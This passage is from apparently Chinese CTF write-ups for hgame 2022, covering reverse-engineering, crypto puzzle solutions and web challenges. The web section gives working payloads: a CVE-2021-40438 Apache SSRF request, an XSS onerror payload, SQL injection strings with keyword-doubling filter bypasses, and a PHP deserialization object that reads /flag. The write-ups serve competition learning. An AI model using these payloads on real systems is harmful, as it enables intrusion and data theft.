b ^= 0x8000 else: b //= 2 b = b &gt;&gt; 8 flag += chr(b)print(flag) 得到flag： fake shell这题最后才弄完的，逻辑还是比较清楚的，但是这题最坑的点在于执行主函数之前的初始化偷偷跑了个函数，把原来的“happyhg4me!”替换成了“w0wy0ugot1t”，导致一直跑不出来。后来放提示才注意到。 正向逻辑调用了两个函数，关键伪代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152unsigned int64 sub_1358(int64 a1)&#123; char v4; // [rsp+27h] [rbp-119h] int i; // [rsp+28h] [rbp-118h] int j; // [rsp+28h] [rbp-118h] int v7; // [rsp+2Ch] [rbp-114h] int64 v8[33]; // [rsp+30h] [rbp-110h] BYREF char a2=&quot;happyhg4me!&quot;; int a3=11; v7 = 0; memset(a1, 0, 256); memset(v8, 0, 256); for ( i = 0; i &lt;= 255; ++i ) &#123; *(_BYTE *)(i + a1) = i; *((_BYTE *)v8 + i) = *(_BYTE *)(i % a3 + a2); &#125; for ( j = 0; j &lt;= 255; ++j ) &#123; v7 = (*((char *)v8 + j) + v7 + *(unsigned int8 *)(j + a1)) % 256; v4 = *(_BYTE *)(j + a1); *(_BYTE *)(j + a1) = *(_BYTE *)(v7 + a1); *(_BYTE *)(a1 + v7) = v4; &#125; return 0;&#125;unsigned int64 sub_1635(int64 a1, int64 a2, unsigned int64 a3)&#123; unsigned int64 result; // rax char v4; // [rsp+23h] [rbp-15h] int v5; // [rsp+24h] [rbp-14h] int v6; // [rsp+28h] [rbp-10h] unsigned int64 i; // [rsp+30h] [rbp-8h] v5 = 0; v6 = 0; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned int8 *)(v5 + a1)) % 256; v4 = *(_BYTE *)(v5 + a1); *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1); *(_BYTE *)(a1 + v6) = v4; *(_BYTE *)(a2 + i) ^= *(_BYTE *)((unsigned int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1); &#125; return result;&#125; 最后给出了加密完的数据，记住逆序，写脚本跑flag： 1234567891011121314151617181920212223242526272829a1 = []a2=&quot;w0wy0ugot1t&quot;v7=0v8=[]for i in range(0, 256): a1.append(i) v8.append(ord(a2[i%11]))for j in range(0, 256): v4 =a1[j] v7=(v8[j]+v7+v4)%256 a1[j]=a1[v7] a1[v7]=v4v5 = 0v6 = 0flag=[0xB6,0x94,0xFA,0x8F,0x3D,0x5F,0xB2,0xE0,0xEA,0x0F,0xD2,0x66,0x98,0x6C,0x9d,0xe7,0x1b,0x08,0x40,0x71,0xc5,0xbe,0x6f,0x6d,0x7c,0x7b,0x09,0x8d,0xa8,0xbd,0xf3,0xf6]s=&#x27;&#x27;for j in range(0, 32): v5 = (v5 + 1) % 256 v4=a1[v5] v6 = (v6 + v4) % 256 a1[v5]=a1[v6] a1[v6]=v4 t=(a1[v5]+a1[v6])% 256 t1=flag[j] t1^=a1[t] s+=chr(t1)print(s) 得到flag： creakme2和creakme相似，都是xtea逻辑，但是这里做了个Windows SEH 异常处理机制，即除零报错。解决方法是判断数据循环中计算后是否为正数，为正数则与0x1234567进行一次异或。 直接改xtea脚本： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B1, sum=0xc78e4d05; //这里加密逻辑变了初始sam值可以跑正向逻辑得到 for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); if((sum &gt;&gt; 31) == 0)&#123; sum ^= 0x1234567; &#125; sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[ 0]=v0; v[1]=v1;&#125;int main()&#123; int i; uint32_t v[8]=&#123;0x457E62CF,0x9537896C,0x1F7E7F72,0x0F7A073D8,0x8E996868,0x40AFAF99,0x0F990E34,0x196F4086&#125;; uint32_t const k[4]=&#123;1,2,3,4&#125;; unsigned int r=32; for (i = 0; i &lt; 4;i++)&#123; decipher(r, (v+i*2), k); printf(&quot;解密后的数据:%x %x\\n&quot;,v[i*2],v[i*2+1]); &#125; return 0;&#125; 十六进制逆向一下跑出来就是flag了： upx magic 1（赛后）这里没办法直接upx -d脱壳的原因是改了upx的头尾tag，因此我们要把值给改回来，即改正为55 50 58 21，改正后就可以直接脱壳了。加密逻辑同样是crc16，脚本也和上面一样。 WEBApache!打开网页发现提示www.zip，下载附件后发现四个配置文件，分别为httpd.conf、httpd-vhosts.conf、docker-compose.yml和default.conf。通过审计配置文件和题目要求我们打入本地内网，判断考点是利用apache漏洞进行ssrf。 搜索相关漏洞。发现CVE-2021-40438漏洞，我们利用这个漏洞进行ssrf打本地。关于这个漏洞可以参考下面的几篇文章：Apache httpd Server CVE-2021-40438 漏洞分析Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 构造请求头： 123456789101112GET /proxy/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: _ga=GA1.2.472555996.1642680122; __gads=ID=ffd6fa567afacd7b-22ce67c00cd00047:T=1642680123:RT=1642680123:S=ALNI_MYrs7iSPv9n3RCqflSqd4vkDHHHBAUpgrade-Insecure-Requests: 1If-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMTIf-None-Match: &quot;22a-5d664045f9580&quot;Cache-Control: max-age=0 得到flag： webpack-engine又是一题网页源代码查找题，这题把flag藏在CSS里了。先点击几次按钮，然后页面跳转到《Never Gonna Give You Up》后翻开CSS即可找到flag： 解两次base64得到flag： At0m的留言板xss，做太少了，输出那块知识盲区了一波，直接给payload： 1&lt;img src=&quot;x&quot; onerror=&quot;this.alt=document.getElementsByTagName(&#x27;script&#x27;)[0].innerHTML&quot;/&gt; 获得flag： Pokemonsql注入题，我做的时候群里没给部分源码，所以是fuzz的，后面给了关键源码： 因此双写绕过+联合注入就可以了，payload： 1234567891011121314151617181920?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(schema_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.schemata%23//information_schema,pokemon?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon&#x27;%23//errors,fllllllllaaaaaag?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon&#x27;/*/**/*/anandd/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;%23//flag?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(flag)/*/**/*/frfromom/*/**/*/fllllllllaaaaaag%23//hgame&#123;C0n9r@tul4tiOn*Y0u$4r3_sq1_M4ST3R#&#125; 一本单词书同样是提示www.zip，下载附件，发现好几个php，逐一审计代码，确定ping、save、admin_check这三个php文件与注入无关，login处有一个黑魔法绕过，get、index、evil三个文件有一个php反序列化考查。 首先是login.php部分代码： 123456789101112131415if ($_POST[&#x27;username&#x27;] != &#x27;adm1n&#x27;) &#123; die(alert(&#x27;username or password is invalid&#x27;));&#125;if (is_numeric($_POST[&#x27;password&#x27;])) &#123; die(alert(&#x27;密码不能设置为纯数字，我妈都知道(￣△￣；)&#x27;));&#125; else &#123; if ($_POST[&#x27;password&#x27;] == 1080) &#123; $_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;; $_SESSION[&#x27;unique_key&#x27;] = md5(randomString(8)); header(&#x27;Location: index.php&#x27;); &#125; else &#123; die(alert(&#x27;这你都能输错？&#x27;)); &#125;&#125; 代码逻辑是验证账号为adm1n，密码为1080，但是密码不能为纯数字，黑魔法绕过即可： 1username：adm1n password：1080a 接着登陆成功进入后进入index.php页面，审计核心代码： 123456789101112async function fresh() &#123; wordlist.innerHTML = &quot;&quot; const pool = (await axios.get(&quot;/get.php&quot;)).data if (pool.length == 0) &#123; pool[&#x27;abandon&#x27;] = &#x27;放弃&#x27; &#125; for (const key in pool) &#123; const value = JSON.stringify(pool[key]) const html = `&lt;li&gt;&lt;span&gt;$&#123;key&#125;-&gt;&lt;/span&gt; &lt;span&gt;$&#123;value&#125;&lt;/span&gt;&lt;/li&gt;` wordlist.innerHTML += html &#125;&#125; 需要调用到get.php来做输入，接着审计get.php核心部分： 1234567891011121314151617181920212223include &#x27;evil.php&#x27;;// flag is in /flagfunction decode(string $data): Array &#123; $result = []; $offset = 0; $length = \\strlen($data); while ($offset &lt; $length) &#123; if (!strstr(substr($data, $offset), &#x27;|&#x27;)) &#123; return []; &#125; $pos = strpos($data, &#x27;|&#x27;, $offset); $num = $pos - $offset; $varname = substr($data, $offset, $num); $offset += $num + 1; $dataItem = unserialize(substr($data, $offset)); $result[$varname] = $dataItem; $offset += \\strlen(serialize($dataItem)); &#125; return $result;&#125; 这个函数将传入的数据进行反序列化，但是只是别|后面的部分，因此在构建反序列化后要在最前面加上|，最后利用evil.php进行反序列化： 12345678910111213141516171819&lt;?phpclass Evil &#123; public $file=&#x27;/flag&#x27;; public $flag; public function __wakeup() &#123; $content = file_get_contents($this-&gt;file); if (preg_match(&quot;/hgame/&quot;, $content)) &#123; $this-&gt;flag = &#x27;hacker!&#x27;; &#125; $this-&gt;flag = $content; &#125;&#125;$a = new Evil;echo serialize($a);//O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;s:4:&quot;flag&quot;;N;&#125; 最后将反序列化写入网页获取flag：","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"【hgame week1】write up","slug":"【hgame-week1】write-up","date":"2022-01-28T14:32:55.000Z","updated":"2022-01-28T14:33:33.672Z","comments":true,"path":"2022/01/28/【hgame-week1】write-up/","link":"","permalink":"http://example.com/2022/01/28/%E3%80%90hgame-week1%E3%80%91write-up/","excerpt":"前言hgame开赛了，第一周的题比较简单，解了大部分非二进制和少部分二进制，估计第二周就不好过了。","text":"前言hgame开赛了，第一周的题比较简单，解了大部分非二进制和少部分二进制，估计第二周就不好过了。 CRYPTODancing Line给了张图片，里面是弯弯曲曲的线： 以右上角的黑色像素点为开头，每个像素下一位向右走则取0，向左走则取1，提取二进制码： 101101000 01100111 01100001 01101101 01100101 01111011 01000100 01100001 01101110 01100011 00110001 01101110 01100111 01011111 01001100 00110001 01101110 01100101 01011111 00110001 00110101 01011111 01100110 01110101 01101110 00101100 01011111 00110001 00110101 01101110 00100111 01110100 01011111 00110001 01110100 00111111 01111101 然后转成字符就是flag了： Easy RSA分析代码： 123456789101112131415161718from math import gcdfrom random import randintfrom gmpy2 import next_primefrom Crypto.Util.number import getPrimefrom secret import flagdef encrypt(c): p = getPrime(8) q = getPrime(8) e = randint(0, p * q) while gcd(e, (p - 1) * (q - 1)) != 1: e = int(next_prime(e)) return e, p, q, pow(ord(c), e, p * q)if __name__ == &#x27;__main__&#x27;: print(list(map(encrypt, flag))) # [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] 随机获取两个质数，然后获取一个范围在0到n之间，并与phi互质的e，并且返回e, p, q, pow(ord(c), e, p * q)。根据分析，我们编写脚本： 1234567891011import libnumlist=[[12433, 149, 197, 104], [8147, 131, 167, 6633], [10687, 211, 197, 35594], [19681, 131, 211, 15710], [33577, 251, 211, 38798], [30241, 157, 251, 35973], [293, 211, 157, 31548], [26459, 179, 149, 4778], [27479, 149, 223, 32728], [9029, 223, 137, 20696], [4649, 149, 151, 13418], [11783, 223, 251, 14239], [13537, 179, 137, 11702], [3835, 167, 139, 20051], [30983, 149, 227, 23928], [17581, 157, 131, 5855], [35381, 223, 179, 37774], [2357, 151, 223, 1849], [22649, 211, 229, 7348], [1151, 179, 223, 17982], [8431, 251, 163, 30226], [38501, 193, 211, 30559], [14549, 211, 151, 21143], [24781, 239, 241, 45604], [8051, 179, 131, 7994], [863, 181, 131, 11493], [1117, 239, 157, 12579], [7561, 149, 199, 8960], [19813, 239, 229, 53463], [4943, 131, 157, 14606], [29077, 191, 181, 33446], [18583, 211, 163, 31800], [30643, 173, 191, 27293], [11617, 223, 251, 13448], [19051, 191, 151, 21676], [18367, 179, 157, 14139], [18861, 149, 191, 5139], [9581, 211, 193, 25595]]flag = &#x27;&#x27;for e,p,q,c in list: n = p*q phi = (p-1)*(q-1) d = libnum.invmod(e,phi) flag += chr(pow(c,d,n))print(flag) 获取flag： Matryoshka密码套娃，一开始给的是盲文，查询转化表： 发现转化出来摩尔斯密码： 1..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-.... 但是直接解密后无法继续解密，尝试逆序摩尔斯码，编写脚本： 1234def strReverse(strDemo): return strDemo[::-1] print(strReverse(&#x27;..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-....&#x27;)) 结果： 1....-/-..../--..--/-..../-..../--..--/....-/..---/--..--/--.../...../--..--/-..../-..../--..--/....-/...../--..--/....-/-..../--..--/-...././--..--/-..../-../--..--/....-/-.-./--..--/--.../...--/--..--/...--/-..../--..--/....-/....-/--..--/...--/...--/--..--/--.../...--/--..--/-..../----./--..--/...../----./--..--/--.../....-/--..--/....-/-.-./--..--/...--/-..../--..--/...../---../--..--/...--/..---/--..--/--.../-----/--..--/...--/....-/--..--/-..../----./--..--/....-/./--..--/...--/-----/--..--/-..../...--/--..--/-..../....-/--..--/...../...--/--..--/-..../-.-./--..--/--.../----./--..--/-..../-.../--..--/-..../-../--..--/...--/----./--..--/--.../..---/--..--/...../.----/--..--/....-/./--..--/...--/----./--..--/-..../..-./--..--/....-/-../--..--/...../...--/--..--/...--/.----/--..--/-..../.-/--..--/-..../-.../--..--/--.../...--/--..--/...--/----./--..--/--.../..---/--..--/....-/-.../--..--/...--/..---/--..--/...../..---/--..--/...--/-..../--..--/-..../-.../--..--/....-/-.-./--..--/...--/---../--..--/-..../---../--..--/-..../..-./--..--/--.../..---/--..--/...--/-----/--..--/...--/-.. 解密得到： 146,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D 发现是十六进制码，转化字符串： 1FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0= 疑似base64码，但不能直接转换，提示有说明凯撒以及维吉尼亚，经过反复尝试应该是维吉尼亚密码，密钥为hgame： 1YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0= base64解得： 1c0bmvghyz_&#123;0Raz_gxxm0thkzo_0ob0m_vokcczt_!r&#125; 这里再跑一次凯撒，位数为21： 1h0gralmde_&#123;0Wfe_lccr0ympet_0tg0r_atphhey_!w&#125; 观察得到应该先取奇数位，再取偶数位，解得flag： 1hgame&#123;Welc0me_t0_the_w0rld_0f_crypt0graphy!&#125; English Novel附件给了很多东西，首先我们来看encrypt.py文件： 1234567891011def encrypt(data, key): assert len(data) &lt;= len(key) result = &quot;&quot; for i in range(len(data)): if data[i].isupper(): result += chr((ord(data[i]) - ord(&#x27;A&#x27;) + key[i]) % 26 + ord(&#x27;A&#x27;)) elif data[i].islower(): result += chr((ord(data[i]) - ord(&#x27;a&#x27;) + key[i]) % 26 + ord(&#x27;a&#x27;)) else: result += data[i] return result 分析逻辑，如果为大写或小写字母，则凯撒位移key位，否则不位移。那么flag.enc中的密文应该也是由这个逻辑得到的。接着我们要对比小说的明文与密文，算出对应的key值，但是由于part被打乱了，因此要找出对应的文件，一番查找找到明文的part0与密文的part175对应。 接着我们写脚本计算key值并解出flag，注意换行符也是要占一位的，脚本中我用空格代替： 1234567891011121314151617181920str1=&#x27; read: &quot;\\&#x27;Alfred Simmonds, Horse Slaughterer and Glue Boiler, Willingdon. Dealer in Hides and Bone-Meal. Kennels Supplied.\\&#x27; Do you not understand what that means? They are taking Boxer to the knacker\\&#x27;s!&quot;A cry of horror burst from all the animals. At this moment the man on the box whipped up his horses and the van moved out of the yard at a smart trot. All the animals followed, crying out at the tops of thei&#x27;str2=&#x27; wwme: &quot;\\&#x27;Lmgzwq Vugmtxht, Hbnvd Shzdheysfhu avv Glpl Wucual, Akmfcmxtem. Xyvuwb ss Rijwr lhm Eltt-Zumi. Xqrthdl Lrriyiwi.\\&#x27; Kq zce nlf fnuypymqae wuws zaoo elyzl? Cikw rev dpfwpk Xuytf to iue eupktlv\\&#x27;o!&quot;E cmy oj kkxxuz xxqrf blzi xsm oki pfrfaeq. Uu wnqq fzeuiv yna lhh mr qnv etj ixrasdl jv ugo haknkf bxd vdi vpk nvoui ofi xv grj smrb fk q npnoi rehx. Qlf cxn mpmiair jgnyzqvd, zxdlaj qjk wi khf ltee cf tric&#x27;fakestr=&quot;klsyf&#123;W0_j0v_ca0z_&#x27;Ks0ao-bln1qstxp_juqfqy&#x27;?&#125;&quot;flag = &#x27;&#x27;key = [None]*420list1=list(str1)list2=list(str2)fake=list(fakestr)for i in range(0,400): key[i] = ord(list1[i])-ord(list2[i])for j in range(0,44): if fake[j].isupper(): flag += chr((ord(fake[j]) - ord(&#x27;A&#x27;) + key[j]) % 26 + ord(&#x27;A&#x27;)) elif fake[j].islower(): flag += chr((ord(fake[j]) - ord(&#x27;a&#x27;) + key[j]) % 26 + ord(&#x27;a&#x27;)) else: flag += fake[j]#print(key)print(flag) 